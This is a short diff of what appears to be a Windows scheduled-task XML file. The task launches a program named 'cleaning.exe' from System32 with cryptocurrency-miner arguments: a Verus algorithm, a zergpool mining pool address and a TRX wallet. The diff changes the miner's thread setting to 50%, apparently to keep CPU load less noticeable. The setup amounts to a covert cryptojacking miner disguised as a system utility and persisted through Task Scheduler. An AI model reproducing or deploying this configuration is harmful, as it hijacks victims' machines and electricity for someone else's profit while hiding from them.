@@ -40,7 +40,7 @@
   <Actions Context="Author">
     <Exec>
       <Command>C:\Windows\System32\cleaning.exe</Command>
-      <Arguments>-a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u TX6q4hbRSNQFuuK9XwC6AebxAAQ9vZvMhM -p c=TRX,ID=Miner -t -1</Arguments>
+      <Arguments>-a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u TX6q4hbRSNQFuuK9XwC6AebxAAQ9vZvMhM -p c=TRX,ID=Miner --threads=50%</Arguments>
     </Exec>
   </Actions>
 </Task>
